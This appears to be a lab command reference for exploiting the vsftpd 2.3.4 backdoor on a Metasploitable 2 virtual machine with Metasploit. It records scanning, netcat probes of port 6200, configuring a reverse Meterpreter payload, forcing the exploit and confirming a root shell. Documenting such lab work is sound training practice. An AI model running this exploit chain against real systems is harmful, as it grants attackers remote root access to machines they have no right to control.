# VSFTPD 2.3.4 Backdoor Command Reference

This file records the commands used during the lab, what each command does, the expected output, and troubleshooting notes. The lab was performed only against Metasploitable 2 on an isolated virtual network.

## Target Details

| Item | Value |
| --- | --- |
| Target IP | `192.168.122.229` |
| Working attacker listener IP | `192.168.122.1` |
| Incorrect listener IP attempted | `192.168.29.255` |
| FTP port | `21/tcp` |
| Backdoor listener port | `6200/tcp` |
| Metasploit listener port | `4444/tcp` |

## Enumeration Commands

### Nmap / Zenmap Service Scan

```bash
nmap -T4 -A -v 192.168.122.229
```

Purpose:

Run an aggressive service and version scan against the Metasploitable 2 target.

Expected output:

```text
21/tcp   open  ftp          vsftpd 2.3.4
22/tcp   open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1
80/tcp   open  http         Apache httpd 2.2.8
3306/tcp open  mysql        MySQL 5.0.51a-3ubuntu5
```

Notes:

- The FTP banner `vsftpd 2.3.4` was the key finding for this lab.
- The scan also exposed other intentionally vulnerable services on Metasploitable 2, but they were outside this lab's exploitation scope.

### Metasploit SSH Version Scanner Context

```text
auxiliary/scanner/ssh/ssh_version
```

Purpose:

Identify SSH service version information.

Expected output:

```text
OpenSSH 4.7p1 Debian 8ubuntu1
```

Notes:

- SSH enumeration helped build a service inventory.
- SSH was not used as the exploitation path in this lab.

## Metasploit Module Selection

### Search for vsFTPd Modules

```text
search vsftp
```

Purpose:

Search Metasploit for modules related to vsFTPd.

Expected output:

```text
auxiliary/dos/ftp/vsftpd_232
exploit/unix/ftp/vsftpd_234_backdoor
```

Notes:

- The denial-of-service module was not selected because the objective was command execution in a lab.
- The correct exploit module for CVE-2011-2523 was `exploit/unix/ftp/vsftpd_234_backdoor`.

### Select the Exploit Module

```text
use exploit/unix/ftp/vsftpd_234_backdoor
```

Purpose:

Load the Metasploit module for the vsFTPd 2.3.4 backdoor.

Expected output:

```text
msf exploit(unix/ftp/vsftpd_234_backdoor) >
```

Notes:

- The Metasploit prompt changes to show the selected module.

### Show Module Options

```text
show options
```

Purpose:

Display required module and payload options.

Expected output:

```text
RHOSTS  yes  The target host(s)
RPORT   21   yes  The target port (TCP)
LHOST        yes  The listen address
LPORT   4444 yes  The listen port
```

Notes:

- `RHOSTS` identifies the target host or hosts.
- `LHOST` must be reachable by the target when using a reverse payload.

## Failed Attempts and Troubleshooting

### Incorrect RHOST Syntax

```text
RHOST 192.168.122.229
```

Purpose:

This was intended to set the target host, but it was entered incorrectly.

Expected output:

```text
[-] Unknown command: RHOST. Did you mean hosts?
```

Troubleshooting:

- Metasploit module options must be changed with `set`.
- Correct syntax:

```text
set RHOSTS 192.168.122.229
```

### Set the Target Host

```text
set RHOST 192.168.122.229
```

Purpose:

Set the remote target host.

Expected output:

```text
RHOST => 192.168.122.229
```

Troubleshooting:

- The module later displayed `RHOSTS`, which is the preferred option name shown by `show options`.
- `RHOSTS` supports one or more targets. `RHOST` may work as an alias in some Metasploit contexts, but `show options` should guide the final configuration.

### Run Without LHOST

```text
run
```

Purpose:

Attempt exploitation.

Expected output:

```text
Msf::OptionValidateError One or more options failed to validate: LHOST.
```

Troubleshooting:

- The selected payload required `LHOST`.
- A reverse payload cannot work until the listener address is configured.

### Set an Incorrect LHOST

```text
set LHOST 192.168.29.255
```

Purpose:

Set the reverse payload listener address.

Expected output:

```text
LHOST => 192.168.29.255
```

Troubleshooting:

- This address was not the correct callback address for the target network.
- The target was on `192.168.122.0/24`, while this listener address was on a different subnet and ended in `.255`.

### Run With Incorrect LHOST

```text
run
```

Purpose:

Attempt exploitation with the incorrect reverse listener address.

Expected output:

```text
Backdoor has been spawned!
Exploit completed, but no session was created.
```

Troubleshooting:

- The exploit trigger reached the target, but the reverse Meterpreter callback did not complete.
- The likely issue was the unreachable or incorrect `LHOST`.

### Correct LHOST

```text
set LHOST 192.168.122.1
```

Purpose:

Set the listener address to the attacker's interface on the same virtual network as the target.

Expected output:

```text
LHOST => 192.168.122.1
```

Notes:

- This value was used during the successful exploitation attempt.

### Correct RHOSTS

```text
set RHOSTS 192.168.122.229
```

Purpose:

Set the target host using the option name shown by the module.

Expected output:

```text
RHOSTS => 192.168.122.229
```

Notes:

- This is the final target configuration used for the successful run.

### Recheck Options

```text
show options
```

Purpose:

Confirm that `RHOSTS`, `RPORT`, `LHOST`, and `LPORT` are set correctly before running the exploit.

Expected output:

```text
RHOSTS  192.168.122.229
RPORT   21
LHOST   192.168.122.1
LPORT   4444
```

Notes:

- Rechecking options before exploitation helps catch network and listener mistakes.

### Run After Backdoor Listener Was Already Triggered

```text
run
```

Purpose:

Attempt exploitation again after correcting `LHOST`.

Expected output:

```text
The port used by the backdoor bind listener is already open/in-use (6200/TCP)
Exploit aborted due to failure
```

Troubleshooting:

- A previous attempt appeared to have triggered the backdoor listener.
- Metasploit's automatic check stopped because the target was not in the clean state expected by the module.

## Port 6200 Investigation

### Scan the Backdoor Port

```bash
nmap -p 6200 192.168.122.229
```

Purpose:

Check whether the vsFTPd backdoor listener port is open.

Expected output:

```text
6200/tcp open  lm-x
```

Notes:

- Port `6200/tcp` being open was consistent with the backdoor listener being triggered.

### Connect to Port 6200

```bash
nc 192.168.122.229 6200
```

Purpose:

Attempt a raw TCP connection to the suspected backdoor listener.

Expected output:

```text
Connected or blank interactive session
```

Troubleshooting:

- A blank terminal can mean the connection opened but did not present a banner.
- This does not replace Metasploit session validation.

### Service Detection on Port 6200

```bash
nmap -sV -p6200 192.168.122.229
```

Purpose:

Check the service state and version on port `6200/tcp`.

Expected output observed:

```text
6200/tcp closed lm-x
```

Troubleshooting:

- The port state changed during testing, which indicated transient listener behavior.
- This explained why Metasploit treated the target state as unreliable.

### Verbose Netcat Connection Attempt

```bash
nc -v 192.168.122.229 6200
```

Purpose:

Attempt another connection to port `6200/tcp` with verbose output.

Expected output observed:

```text
nc: connect to 192.168.122.229 port 6200 (tcp) failed: Connection refused
```

Troubleshooting:

- By this point, the listener was no longer accepting connections.
- The exploit path needed to be retried from Metasploit with the corrected listener settings.

## Module Information and Payload Review

### View Module Information

```text
info exploit/unix/ftp/vsftpd_234_backdoor
```

Purpose:

Display module description, references, authors, platform, and targets.

Expected output:

```text
Name: VSFTPD 2.3.4 Backdoor Command Execution
Platform: Unix, Linux
Privileged: Yes
Disclosure Date: 2011-07-03
```

Notes:

- The module description explains that a malicious backdoor was added to the vsFTPd download archive.

### Unset Payload

```text
unset payload
```

Purpose:

Attempt to clear the selected payload.

Expected output:

```text
Variable "payload" unset - but will use a default value still.
```

Troubleshooting:

- Unsetting `payload` does not necessarily leave the module without a payload.
- Metasploit may continue to use a default compatible payload.

### Show Compatible Payloads

```text
show payloads
```

Purpose:

List payloads compatible with the selected exploit module.

Expected output:

```text
Compatible Payloads
payload/cmd/unix/generic
payload/generic/shell_reverse_tcp
payload/cmd/linux/http/x86/meterpreter_reverse_tcp
...
```

Notes:

- The actual output is long.
- The important takeaway is that both command, bind, and reverse payload styles were available.

## Successful Exploitation

### Force the Exploit Check Result

```text
set ForceExploit true
```

Purpose:

Tell Metasploit to proceed even though the automatic check could not reliably confirm exploitability.

Expected output:

```text
ForceExploit => true
```

Troubleshooting:

- `ForceExploit` should be used carefully.
- In this lab it was used only after confirming the target was Metasploitable 2, the banner matched `vsftpd 2.3.4`, and the failure was related to port `6200/tcp` state from earlier attempts.

### Run the Exploit Successfully

```text
run
```

Purpose:

Execute the exploit with corrected options and `ForceExploit` enabled.

Expected output:

```text
Backdoor has been spawned!
Meterpreter session 1 opened (192.168.122.1:4444 -> 192.168.122.229:54897)
```

Notes:

- This confirmed successful exploitation.
- The callback source port on the target may vary between runs.

## Post-Exploitation Commands

### List Filesystem Root in Meterpreter

```text
meterpreter > ls
```

Purpose:

List the current directory from the Meterpreter session.

Expected output:

```text
Listing: /
bin
boot
dev
etc
home
root
tmp
usr
var
```

Notes:

- This demonstrated filesystem access through Meterpreter.

### Incorrect Meterpreter Command: uname

```text
meterpreter > uname -a
```

Purpose:

Attempt to run a Linux command directly in Meterpreter.

Expected output:

```text
Unknown command: uname.
```

Troubleshooting:

- `uname` is an operating system command, not a Meterpreter command in this context.
- Open a shell first with `shell`.

### Incorrect Meterpreter Command: whoami

```text
meterpreter > whoami
```

Purpose:

Attempt to run a Linux command directly in Meterpreter.

Expected output:

```text
Unknown command: whoami.
```

Troubleshooting:

- `whoami` must be run inside an interactive system shell.

### Open a System Shell

```text
meterpreter > shell
```

Purpose:

Open an interactive command shell on the target.

Expected output:

```text
Process 5155 created.
Channel 1 created.
```

Notes:

- Process and channel IDs may differ in future runs.

### List Files from the System Shell

```bash
ls
```

Purpose:

Confirm shell command execution and list the current directory.

Expected output:

```text
bin
boot
dev
etc
home
root
tmp
usr
var
```

Notes:

- This showed that commands were executing in the target shell, not just inside Meterpreter.

### Confirm Current User

```bash
whoami
```

Purpose:

Confirm the privilege level of the shell.

Expected output:

```text
root
```

Notes:

- The exploit resulted in a root shell in this Metasploitable 2 lab.

### Confirm Kernel and Host Information

```bash
uname -a
```

Purpose:

Validate the target system identity and kernel version.

Expected output:

```text
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

Notes:

- This output confirmed the target host and Linux kernel details.

## Troubleshooting Summary

| Issue | Cause | Fix |
| --- | --- | --- |
| `Unknown command: RHOST` | Option was entered as a command | Use `set RHOSTS <target>` |
| `LHOST` validation failure | Reverse payload listener was not configured | Set `LHOST` to the attacker's reachable interface |
| Backdoor spawned but no session | Incorrect or unreachable callback address | Use `192.168.122.1` on the target's virtual network |
| Port `6200/tcp` already open | Previous exploit attempt triggered the backdoor listener | Validate port state and use `ForceExploit` only in the controlled lab |
| `uname` / `whoami` unknown in Meterpreter | Commands were entered in Meterpreter instead of a system shell | Run `shell`, then execute Linux commands |
